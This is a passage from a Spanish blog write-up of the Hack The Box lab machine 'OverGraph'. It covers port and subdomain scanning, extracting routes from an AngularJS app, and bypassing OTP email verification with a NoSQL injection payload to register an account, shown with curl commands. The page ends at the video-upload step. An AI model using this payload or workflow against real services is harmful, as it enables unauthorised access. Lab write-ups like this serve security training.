<!doctype html><html lang="es"><head><title>OverGraph | 7Rocky</title><meta charset="utf-8"><meta http-equiv="x-ua-compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta name="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root"><meta itemprop="description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root"><meta name="twitter:card" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root"><meta name="twitter:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root"><meta property="og:description" content="Hack The Box. Linux. Máquina difícil. Esta máquina tiene una página web que es vulnerable a Open Redirect, una aplicación web hecha en AngularJS vulnerable a Client-Side Template Injection y XSS, y una implementación de GraphQL. Somos capaces de registrar una nueva cuenta al saltarnos un código OTP mediante una inyección NoSQL. Luego, podemos realizar un ataque de CSRF abusando del Open Redirect para inyectar un payload de XSS en el perfil de la víctima para obtener su adminToken, que está guardado en localStorage. Después, podemos subir archivos de video que serán procesados por ffmpeg y explotar un Server-Side Request Forgery que nos permite leer archivos del servidor. Finalmente, ganaremos acceso a la máquina como un usuario y podemos encontrar un binario está en ejecución como root. Después de analizarlo, podemos obtener un token válido para usar el programa y exploitar una vulnerabilidad para escribir datos arbitrarios en una dirección arbitraria, derivando en RCE o permisos de lectura como root"><meta property="og:type" content="article"><meta name="robots" content="index, follow"><meta name="author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="twitter:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta property="og:author" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta name="image" content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta property="og:image" content="https://7rocky.github.io/images/HTB/OverGraph/OverGraph.png"><meta property="og:site_name" content="Blog de 7Rocky. Ciberseguridad y Mates"><meta itemprop="name" content="OverGraph"><meta property="twitter:title" content="OverGraph"><meta property="og:title" content="OverGraph"><meta property="og:url" content="https://7rocky.github.io/htb/overgraph/"><meta itemprop="keywords" content="otp,graphql,angularjs,open-redirect,nosqli,reversing,file-upload,port-forwarding,xss,binary-exploitation,directory-path-traversal,static-code-analysis,csrf,ssrf,rce,"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script><link rel="shortcut icon" href="/favicon.ico" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><script src="/js/htb.js"></script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Buscar" rel="noopener" aria-label="Buscar"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="#" title="es"><img alt="es" height="30px" src="/images/es.png" width="30px"></a>
<a class="link-transition lang link dib z-999 pt3 pt0-l" href="/en/htb/overgraph/" title="en"><img alt="en" height="30px" src="/images/en.png" style="border:4px solid#000;border-radius:100%" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-100"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/htb/overgraph/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/htb/overgraph/&text=OverGraph" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&url=https://7rocky.github.io/htb/overgraph/&title=OverGraph" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">OverGraph</h1><time class="mt4 f6 dib tracked" datetime="2022-08-06T00:00:00+01:00">06 / 08 / 2022</time><br><p class="mb4 f6 dib tracked">30 minutos de lectura</p></header><div class="htb-image"><img alt="OverGraph" src="/images/HTB/OverGraph/OverGraph.png"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/otp" title="OTP">OTP</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/graphql" title="GraphQL">GraphQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/angularjs" title="AngularJS">AngularJS</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/open-redirect" title="<em>Open Redirect</em>"><em>Open Redirect</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/nosqli" title="Inyección NoSQL">Inyección NoSQL</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/reversing" title="Ingeniería inversa">Ingeniería inversa</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/file-upload" title="Subida de archivos">Subida de archivos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/port-forwarding" title="Reenvío de puertos">Reenvío de puertos</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/xss" title="<em>Cross-Site Scripting</em>"><em>Cross-Site Scripting</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/binary-exploitation" title="Explotación de binarios">Explotación de binarios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/directory-path-traversal" title="Navegación de directorios">Navegación de directorios</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/static-code-analysis" title="Análisis de Código Estático">Análisis de Código Estático</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/csrf" title="<em>Cross-Site Request Forgery</em>"><em>Cross-Site Request Forgery</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/ssrf" title="<em>Server-Side Request Forgery</em>"><em>Server-Side Request Forgery</em></a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/tags/rce" title="Ejecución remota de comandos">Ejecución remota de comandos</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#escaneo-de-puertos">Escaneo de puertos</a></li><li><a href="#enumeración-web">Enumeración web</a></li><li><a href="#registrando-una-nueva-cuenta">Registrando una nueva cuenta</a></li><li><a href="#encontrando-vulnerabilidades">Encontrando vulnerabilidades</a></li><li><a href="#enumeración-de-graphql">Enumeración de GraphQL</a></li><li><a href="#explotación-para-obtener-admintoken">Explotación para obtener <code>adminToken</code></a></li><li><a href="#explotación-de-la-subida-de-archivos-de-vídeo">Explotación de la subida de archivos de vídeo</a></li><li><a href="#enumeración-del-sistema">Enumeración del sistema</a></li><li><a href="#analizando-el-binario-nreport">Analizando el binario <code>nreport</code></a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#escalada-de-privilegios">Escalada de privilegios</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>SO</strong>: Linux</li><li><strong>Dificultad</strong>: Difícil</li><li><strong>Dirección IP</strong>: 10.10.11.157</li><li><strong>Fecha</strong>: 30 / 04 / 2022</li></ul><h2 id="escaneo-de-puertos">Escaneo de puertos</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.92 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.157 -p 22,80
Nmap scan report for 10.10.11.157
Host is up (0.045s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 34:a9:bf:8f:ec:b8:d7:0e:cf:8d:e6:a2:ce:67:4f:30 (RSA)
|   256 45:e1:0c:64:95:17:92:82:a0:b4:35:7b:68:ac:4c:e1 (ECDSA)
|_  256 49:e7:c7:5e:6a:37:99:e5:26:ea:0e:eb:43:c4:88:59 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://graph.htb
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 7.99 seconds
</code></pre></div><p>La máquina tiene abiertos los puertos 22 (SSH) y 80 (HTTP).</p><h2 id="enumeración-web">Enumeración web</h2><p>Si vamos a <code>http://10.10.11.157</code> se nos redirige a <code>http://graph.htb</code>. Por tanto, tenemos que poner este dominio en <code>/etc/hosts</code> para ver la página web:</p><p><img src="/images/HTB/OverGraph/OverGraph-index.png" alt="OverGraph index"></p><p>Si inspeccionamos el código fuente, vemos un código en JavaScript que realiza una redirección si <code>redirect</code> aparece como parámetro de URL. Esto puede ser útil para después porque actúa como un <em>Open Redirect</em>:</p><p><img src="/images/HTB/OverGraph/OverGraph-index-redirect.png" alt="OverGraph index redirect"></p><p>De momento, vamos a enumerar más subdominios usando <code>ffuf</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ffuf</span> -w $WORDLISTS/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.11.157 -H <span class="code-dark-yellow">'Host: FUZZ.graph.htb'</span> -fl 8  
<span class="code-dark-green">internal                [Status: 200, Size: 607, Words: 36, Lines: 15, Duration: 49ms]</span>
</code></pre></div><p>Genial, vamos a añadir <code>internal.graph.htb</code> a <code>/etc/hosts</code> y a ver qué hay:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-login.png" alt="OverGraph internal login"></p><p>Tenemos un formulario de inicio de sesión. Podemos probar con credenciales por defecto, pero no funcionan. Algo interesante es que esta aplicación web está hecha en AngularJS. El archivo <code>index.html</code> solamente carga los archivos CSS y JavaScript que renderizarán la página completa:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-spa.png" alt="OverGraph internal SPA"></p><p>Se trata de una aplicación de una sola página (<em>Single Page Application</em>, SPA), por lo que no podremos enumerar rutas como suempre (con <code>ffuf</code>). Sin embargo, podemos leer el archivo JavaScript principal (<code>main.0681ef4e6f13e51b.js</code>) y extraer algunas rutas desde ahí:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal.graph.htb/main.0681ef4e6f13e51b.js -s | <span class="code-dark-green">grep</span> -oE <span class="code-dark-yellow">"['<span class="code-dark-cyan">\"</span>]/.*?['<span class="code-dark-cyan">\"</span>]"</span> | <span class="code-dark-green">grep</span> -v <span class="code-dark-yellow">"['<span class="code-dark-cyan">\"</span>]/*['<span class="code-dark-cyan">\"</span>]"</span> | <span class="code-dark-green">sort</span> -u  
"/("
"/dashboard"
"/g,'
"/graphql"
"/inbox"
"/logout"
"/profile"
"/register"
"/tasks"
"/uploads"
'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E\"
'/%3E%3Cpath d='
'/%3E%3Cpath id='
'/graphql'
</code></pre></div><p>Vale, tenemos:</p><ul><li><code>/dashboard</code></li><li><code>/graphql</code></li><li><code>/inbox</code></li><li><code>/logout</code></li><li><code>/profile</code></li><li><code>/register</code></li><li><code>/tasks</code></li><li><code>/uploads</code></li></ul><p>Solamente las tres últimas rutas funcionan. Las otras redirigen al formulario de <em>login</em>, a excepción de <code>/graphql</code>, que espera una consulta de GraphQL.</p><p>Esto es <code>/register</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-register.png" alt="OverGraph internal register"></p><p>Esto es <code>/tasks</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-tasks.png" alt="OverGraph internal tasks"></p><p>Y esto es <code>/uploads</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-uploads.png" alt="OverGraph internal uploads"></p><p>Esta subida de archivos de vídeo parece interesante. A lo mejor es explotable después.</p><h2 id="registrando-una-nueva-cuenta">Registrando una nueva cuenta</h2><p>De momento, vamos a intentar registrar una nueva cuenta. Tenemos que añadir una dirección de correo que termine en <code>@graph.htb</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-register-trial.png" alt="OverGraph internal register trial"></p><p>Y aparentemente, el servidor nos ha enviado un código OTP por correo, pero no tenemos esta dirección de correo. Vamos a capturar la petición con Burp Suite:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-verify-burp.png" alt="OverGraph internal verify Burp"></p><p>Vale, tenemos otro subdominio llamado <code>internal-api.graph.htb</code>. Si probamos a enviar más códigos OTP, el servidor se bloquea después de 4 intentos. Por tanto, sacar el código OTP no parece que sea el camino.</p><p>De hecho, si analizamos el código JavaScript (previamente formateado con el depurador del navegador), podemos buscar por <code>"register"</code> y descubrir cómo se registran las nuevas cuentas, evitando el código OTP:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-register-endpoint.png" alt="OverGraph internal register endpoint"></p><p>Solo tenemos que enviar una petición POST a <code>internal-api.graph.htb/api/register</code> con nuestros datos. Algo así:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/api/register -d <span class="code-dark-yellow">'{"email":"rocky@graph.htb","username":"rocky","password":"asdffdsa","confirmPassword":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
{"result":"Invalid Email / Email not verified"}
</code></pre></div><p>Vaya, parece que no será tan fácil. Entonces, tenemos que verificar nuestro <em>email</em> primero. Mirando a la petición en Burp Suite, vemos que el código OTP se envía como <em>string</em> en un documento JSON:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-otp-code.png" alt="OverGraph internal OTP code"></p><p>Entonces, podemos probar inyecciones y técnicas de <em>Type Juggling</em>. Finalmente, encontraremos que con un <em>payload</em> de inyección NoSQL (tomada de <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection">PayloadsAllTheThings</a>) como <code>{"$ne":"foo"}</code>, nos saltaríamos la verificación si el servidor es vulnerable:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-otp-nosqli.png" alt="OverGraph internal OTP NoSQLi"></p><p>Y lo es. Ahora tenemos una dirección de correo verificada y ya sí que podemos registrar la cuenta:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/api/register -d <span class="code-dark-yellow">'{"email":"rocky@graph.htb","username":"rocky","password":"asdffdsa","confirmPassword":"asdffdsa"}'</span> -H <span class="code-dark-yellow">'Content-Type: application/json'</span>  
{"result":"Account Created Please Login!"}
</code></pre></div><p>En este punto, podemos acceder a <code>/dashboard</code> y <code>/profile</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard.png" alt="OverGraph internal dashboard"></p><p><img src="/images/HTB/OverGraph/OverGraph-internal-profile.png" alt="OverGraph internal profile"></p><p>Además, podemos ver un mensaje de Mark en <code>/inbox</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-inbox.png" alt="OverGraph internal inbox"></p><p><strong>Nota:</strong> La máquina reinicia su base de datos cada rado, y también, los usuarios que escriben mensajes van cambiando entre Mark, Larry, Sally, Alen&mldr; De ahora en adelante, me referiré a otros usuarios como &ldquo;Mark&rdquo;.</p><p>Si inspeccionamos un poco más la web, veremos que la autenticación se realiza mediante <em>tokens</em> JWT:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-jwt.png" alt="OverGraph internal JWT"></p><p>Y también con <code>localStorage</code>:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-localstorage.png" alt="OverGraph internal localStorage"></p><h2 id="encontrando-vulnerabilidades">Encontrando vulnerabilidades</h2><p>Si modificamos la clave <code>admin</code> a <code>"true"</code>, veremos un enlace a &ldquo;<em>Uploads</em>&rdquo; en la izquierda (aunque ya sabíamos que esta ruta <code>/uploads</code> existía):</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard-admin.png" alt="OverGraph internal dashboard admin"></p><p>Además, sabemos que Mark es un usuario válido, y de hecho, si cambiamos nuestro <code>username</code> y <code>email</code>, entraremos en la sesión de Mark:</p><p><img src="/images/HTB/OverGraph/OverGraph-internal-dashboard-mark.png" alt="OverGraph internal dashboard Mark"></p><p>Pensando en la subida de archivos de vídeo, para poder usar la funcionalidad, necesitamos un <code>adminToken</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> internal-api.graph.htb/admin/video/upload -d <span class="code-dark-yellow">''</span>  
{"result": "No adminToken header present"}
